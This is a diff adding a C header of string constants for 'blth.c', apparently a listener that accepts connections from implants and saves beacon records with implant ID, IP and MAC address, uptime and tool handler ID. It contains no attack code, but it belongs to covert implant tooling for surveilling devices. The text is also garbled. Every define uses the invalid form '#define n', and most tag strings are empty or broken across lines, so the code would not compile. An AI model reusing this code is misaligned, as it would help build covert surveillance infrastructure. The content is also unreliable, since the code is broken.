@@ -1,0 +1,61 @@
+// blth.c Strings========================================
+
+// Note that we use a C code style for comments...
+// Recommend that we list the name of the sourcecode file that contains/uses
+// the string like we did above.
+// 
+// The "#define n" portion below is standard.
+//
+//        Name of String     String contents enclosed in double quotes.
+//        |                  |
+//        |                  |
+//        |                  |
+//        V                  V
+// blth.c
+#define n usageString "Usage:\n"
+#define n commandString "-p [listening port] -f [rsi file directory path]\n"
+#define n pOptionString " [-p listing port]	- port to listen on for swindle connections\n"
+#define n fOptionString " [-f file path]	- path to the directory where beacon rsi file should be saved.\n"
+#define n cmdLineOptionFlags "p:f:h"
+#define n defaultPath "beacons/"
+#define n bindString " . Bind on localhost:"
+#define n bindFailedString "failed\n ! net_bind returned "
+#define n waitingString " . Waiting for a remote connection ..."
+#define n acceptFailedString " failed\n ! net_accept returned "
+#define n xmlOpen "\n"
+#define n headerOpen "
+\n"
+#define n implantIdOpen ""
+#define n implantIdClose "\n"
+#define n ipOpen ""
+#define n ipClose "\n"
+#define n timeStampOpen ""
+#define n timeStampClose "\n"
+#define n byteCountOpen ""
+#define n byteCountClose "\n"
+#define n dataDescOpen ""
+#define n dataDescBeacon "Beacon"
+#define n dataDescClose "\n"
+#define n toolHandlerIdOpen ""
+#define n toolHandlerIdClose "\n"
+#define n headerClose "
+\n"
+#define n beaconOpen "\n"
+#define n deviceStatOpen "\n"
+#define n seqNum "0\n"
+#define n ackNum "0\n"
+#define n seqTrigger "0\n"
+#define n uptimeOpen ""
+#define n uptimeClose "\n"
+#define n deviceStatClose "\n"
+#define n deviceIPOpen "\n"
+#define n netAddrOpen "\n"
+#define n addrStringOpen ""
+#define n addrStringClose "\n"
+#define n beaconIPMask "\n"
+#define n netAddrClose "\n"
+#define n deviceIPClose "\n"
+#define n macAddrOpen ""
+#define n macAddrClose "\n"
+#define n beaconClose "\n"
+#define n xmlClose "\n"
